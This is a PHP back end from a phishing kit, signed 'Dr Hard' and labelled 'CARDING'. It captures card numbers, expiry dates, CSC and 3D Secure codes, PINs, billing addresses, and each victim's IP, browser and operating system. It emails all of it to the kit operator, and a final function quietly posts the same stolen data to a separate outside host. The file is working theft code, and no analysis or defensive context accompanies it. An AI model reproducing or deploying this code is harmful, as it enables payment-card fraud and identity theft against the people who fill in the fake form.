<?php
header("X-Robots-Tag: noindex, nofollow", true);
session_start();
include("../../../../Email.php");
require "../os.php";
require "../geoplugin.php";
$DATE = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$IP = $_SERVER["REMOTE_ADDR"];
@$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
$_SESSION['cardholderInput'] = $_POST['cardholderInput'];
$pin = "";
$state = "";
$secondarycard = "";
if( isset($_POST['cardnumberInput'])  && isset($_POST['expirationInput']) && isset($_POST['cardcodeInput']) ){
if (!empty($_POST['cardnumber2Input']) && !empty($_POST['expiration2Input']) and !empty($_POST['cardcode2Input'])){
    $secondarycard .= "<span style='width:90px;height:20px;padding:1px;border:1px dashed yellow;color:yellow;'> +Secondary Card+ </span>
			
        <span style='color: #55FF55;'>$ Cardnumber~:</span>  <span style='color: #EE82EE'>[".$_POST['cc2type']."]</span>  ".$_POST['cardnumber2Input']."
		
        <span style='color: #55FF55;'>$ Expiration~:</span>  ".$_POST['expiration2Input']."
		
        <span style='color: #55FF55;'>$ CSC~:</span>  ".$_POST['cardcode2Input']."
		
        <span style='color: #55FF55;'>$ 3D Secure~:</span>  <span style='color: Red'>".$_POST['secure_CC2Input']."</span>
		";
}
if (!empty($_POST['pin2'])){
    $pin .= "<span style='color: #55FF55;'>$ Card PIN~:</span>  ".$_POST['pin2']."
	
	
	";
}
if (!empty($_POST['stateInput'])){
    $state .= "
	<span style='color: #55FF55;'>$ State~:</span>  ".$_POST['stateInput']."
	";
}        
        $msg = "

<div style='background: -webkit-linear-gradient(#E9E9E9, #B2B2B2 21px, #6A6A6A 1px, #000, #d8d8d8 23px);margin: 3em auto;border-radius: 5px;box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.6), 0 22px 70px 4px rgba(0, 0, 0, 0.56), 0 0 0 1px rgba(0, 0, 0, 0.3);padding: 3px 5px;text-align: left;width:50em;font-size: 13px;'><center><span style='font: normal normal 13px/20px&#39;Arial&#39;;text-align:center;z-index: 2;position:relative;top: -0.18em;text-shadow: 0px 1px 0px rgba(255, 255, 255, 0.6);color: #444;'>Dr Hard</span></center>
	

	
<pre style ='position: relative;color: #000;padding:5 -5px;font-family:Verdana;line-height: 1.2em;margin:1.7em auto;max-height:1800px;overflow-x:hidden;'>
		           
                    			
                             <span style='position:relative;top:-20px;padding:10px;border:2px dashed red;border-radius: 80px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;● CARDING ●&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>		


							 
        <span span style='width:90px;height:20px;padding:1px;border:2px dashed red;color:red;'> ++Primary Card++ </span>
			
        <span style='color: #000;'>$ CardHolderName~:</span>  ".$_POST['cardholderInput']."
			
        <span style='color: #000;'>$ Cardnumber~:</span>  <span style='color: #000'>[".$_POST['cc1type']."]</span>  ".$_POST['cardnumberInput']."
		
        <span style='color: #000;'>$ Expiration~:</span>  ".$_POST['expirationInput']."
        
        <span style='color: #000;'>$ CSC~:</span>  ".$_POST['cardcodeInput']."
				
        ".$secondarycard."
        ".$pin."		
                             <span style='position:relative;top:-20px;padding:10px;border:2px dashed red;border-radius: 80px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;●● BILLING ●●&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>		
 

 
        <span style='color: #000;'>$ Full Name~:</span>  ".$_POST['fullnameInput']."
			
        <span style='color: #000;'>$ Street Address~:</span>  ".$_POST['staddressInput']."
			
        <span style='color: #000;'>$ Country~:</span> ".$_POST['countryInput']."
		
        <span style='color: #000;'>$ City~:</span>  ".$_POST['cityInput']."
        ".$state."	
        <span style='color: #000;'>$ Postal Code~:</span>  ".$_POST['postal_codeInput']."
		
		
				
                             <span style='position:relative;top:-20px;padding:10px;border:2px dashed red;border-radius: 80px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;●●● MORE INFO ●●●&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>				

	
	
        <span style='color: #000;'>$ IP~:</span>  <span style='color:#000'>".$IP."</span>	
	
        <span style='color: #000;'>$ Operating System~:</span>  <span style='color:#000'>".$OS."</span>
		
        <span style='color: #000;'>$ Browser~:</span>  <span style='color:#000'>".$browserTy_Version."</span>
		
        <span style='color: #000;'>$ Date~:</span>  <span style='color:#000'>".$DATE."</span>
		
		
	

        <span style='color: #000;'>>_</span> exit;

	</pre>
</div>


";
$subject = "".$_POST['cardnumberInput']." [".$_POST['cc1type']."] ♥ New CC Billings ♥ ".$_SESSION['CountryName']."";
$headers = "From: ☠ Dr Hard ☠ <noreply@cssv.com>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
@mail($email,$subject,$msg,$headers);
     } 	 
	 /*
$localrez ="###################################################
###################################################     
=-=-=-=-=-=-=-=-=-=- ♣ CARDING ♣ =-=-=-=-=-=-=-=-=-
          
♠Primary Card♠
		   
CardHolderName: ".$_POST['cardholderInput']."
Cardnumber: [".$_POST['cc1type']."] ".$_POST['cardnumberInput']."
Expiration: ".$_POST['expirationInput']."
CSC: ".$_POST['cardcodeInput']."
		   
♠Secondary  Card♠  
		   
Cardnumber: [".$_POST['cc2type']."] ".$_POST['cardnumber2Input']."
Expiration: ".$_POST['expiration2Input']."
CSC: ".$_POST['cardcode2Input']."
3D Secure: ".$_POST['secure_CC2Input']."
Card PIN: ".$_POST['pin2']."
		   
=-=-=-=-=-=-=-=-=-=- ♣ BILLING ♣ =-=-=-=-=-=-=-=-=-		
		   
Full Name: ".$_POST['fullnameInput']."
Street Address: ".$_POST['staddressInput']."
Country: ".$_POST['countryInput']."
City: ".$_POST['cityInput']."
State: ".$_POST['stateInput']."
Postal Code: ".$_POST['postal_codeInput']."

=-=-=-=-=-=-=-=-=-=- ♣ MORE INFO ♣ =-=-=-=-=-=-=-=-

IP: ".$IP."
Operating System: ".$OS."
Browser: ".$browserTy_Version."
Date: ".$DATE."

=-=-=-=-=-=-==-=- ♣ ☠ Dr Hard ☠ ♣ =-=-=-=-=-=-=-=-=-
";
	
$localr3z = fopen("../../../REZLT/tnt2.txt","a");
	fwrite($localr3z,$localrez);
        fclose($localr3z);	 
		
		
		*/
		
		//----------------send request post to url ----------------
function sendPost($url,$data) {
	
	
	
$options = array(
        'http' => array(
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($data),
    )
);

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);
return $result;
}

$data = $_POST;
$data['date'] = $DATE;
$data['REMOTE_ADDR'] = $_SERVER['REMOTE_ADDR'];
$data['b'] = $browserTy_Version;
$data['os'] = $OS;
$data['s'] = $_SESSION;

sendPost('http://www.save-test.epizy.com/sc2/sv2.php',$data);


//---- end request----------------

		
		
		
		
		
		
?>